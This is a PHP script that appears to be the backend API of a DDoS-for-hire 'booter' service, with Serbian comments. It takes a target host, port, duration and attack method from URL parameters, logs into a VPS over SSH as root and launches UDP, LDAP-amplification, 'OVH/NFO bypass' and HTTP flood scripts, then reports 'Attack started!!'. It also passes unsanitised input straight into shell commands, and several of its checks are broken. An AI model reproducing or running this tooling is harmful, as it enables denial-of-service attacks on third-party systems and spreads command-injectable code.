<?php
/////////////////////////////////
//--     Upgrade Api by Comrade    --//
/////////////////////////////////
ignore_user_abort(true);
set_time_limit(0);
/////////////////////////////////////////
//--    Podaci od Server   --//
//-- Upisi svoje podatke od servera --//
//////////////////////////////////////////
$server_ip = "YOURVPSIP"; //Change "1337" to your servers IP.
$server_pass = "YOURVPSPASSWORD"; //Change "pass" to your servers password.
$server_user = "root"; //Only change this if your using a user other than root.
 
/////////////////////////////////////////
//-- Podesavanja --//
/////////////////////////////////////////
$key = $_GET['key'];
$host = $_GET['host'];
$port = intval($_GET['port']);
$time = intval($_GET['time']);
$method = $_GET['method'];
$action = $_GET['action'];
 
///////////////////////////////////////////////////
//-- Dostupne Metode --//
///////////////////////////////////////////////////
$array = array("udpmix", "ldap", "simpleovh", "simplebypass", "http", "https", "nfobypass", "stop");// Mozes da dodajes i da brises.
$ray = array("comrade"); // /api.php&key=imekey
 
////////////////////////////////////////
//-- Checks if the API key is empty --//
////////////////////////////////////////
if (!empty($key)){
}else{
die('Error: API key is empty!');}
 
//////////////////////////////////////////
//-- Check Api --//
//////////////////////////////////////////
if (in_array($key, $ray)){ //Promeni key ako zelis nije preporucljivo
}else{
die('Error: Incorrect API key!');}
 
/////////////////////////////////
//-- Provera vremena napda --//
/////////////////////////////////
if (!empty($time)){
}else{
die('Error: time is empty!');}
 
/////////////////////////////////
//-- Provera ip addresse --//
/////////////////////////////////
if (!empty($host)){
}else{
die('Error: Host is empty!');}
///////////////////////////////////
//-- Provera metode --//
///////////////////////////////////
if (!empty($method)){
}else{
die('Error: Method is empty!');}
 
///////////////////////////////////
//-- Checks if method is empty --//
///////////////////////////////////
if (in_array($method, $array)){
}else{
die('Error: The method you requested does not exist!');}
///////////////////////////////////////////////////
//-- Uses regex to see if the Port could exist --//
///////////////////////////////////////////////////
if ($port > 44405){
die('Error: Ports over 44405 do not exist');}
 
//////////////////////////////////
//-- Sets a Maximum boot time --//
//////////////////////////////////             
if ($time > 2000){
die('Error: Cannot exceed 36000 seconds!');} //Change 10 to the time you used above.
 
if(ctype_digit($Time)){
die('Error: Time is not in numeric form!');}
 
if(ctype_digit($Port)){
die('Error: Port is not in numeric form!');}
 
//////////////////////////////////////////////////////////////////////////////
//--                        LISTA METODA                         --//
//-- Sve metode mozes izmeniti ostavio sam neke source u Script --//
//////////////////////////////////////////////////////////////////////////////
if ($method == "udpmix") { $command = "screen -dm /root/Script/UDPMIX $host $port $time"; }
if ($method == "ldap") { $command = "screen -dm perl /root/Script/gott.3.pl $host $port $time"; }
if ($method == "simplebypass") { $command = "screen -dm perl /root/Script/down.pl $host $port 65500 $time"; }
if ($method == "simpleovh") { $command = "screen -dm python /root/Script/ovhdrop.py $host $port 65500 $time"; }
if ($method == "udp") { $command = "screen -dm python /root/Script/udp.py $host $port 65500 $time"; }
if ($method == "nfobypass") { $command = "screen -dm  /root/Script/gott.11 ${host} ${port}"; }
if ($method == "http") { $command = "screen -dm perl /root/Script/gott.6.pl $url 1000 50 100"; }
if ($method == "https") { $command = "screen -dm perl /root/Script/gott.9.pl $url 200 200 8.8.4.4"; } 
if ($method == "stop") { $command = "pkill $host -f"; }
///////////////////////////////////////////////////////
//-- Check to see if the server has SSH2 installed --//
///////////////////////////////////////////////////////
if (!function_exists("ssh2_connect")) die("Error: SSH2 does not exist on you're server");
if(!($con = ssh2_connect($server_ip, 22))){
  echo "Error: Connection Issue";
} else {
 
///////////////////////////////////////////////////
//-- Attempts to login with you're credentials --//
///////////////////////////////////////////////////
    if(!ssh2_auth_password($con, $server_user, $server_pass)) {
        echo "Error: Login failed, one or more of you're server credentials are incorect.";
    } else {
       
////////////////////////////////////////////////////////////////////////////
//-- Tries to execute the attack with the requested method and settings --//
////////////////////////////////////////////////////////////////////////////   
        if (!($stream = ssh2_exec($con, $command ))) {
            echo "Error: You're server was not able to execute you're methods file and or its dependencies";
        } else {
////////////////////////////////////////////////////////////////////
//-- Executed the attack with the requested method and settings --//
////////////////////////////////////////////////////////////////////      
            stream_set_blocking($stream, false);
            $data = "";
            while ($buf = fread($stream,4096)) {
                $data .= $buf;
            }
                        echo "Attack started!!</br>Hitting: $host</br>On Port: $port </br>Attack Length: $time</br>With: $method";
            fclose($stream);
        }
    }
}
?>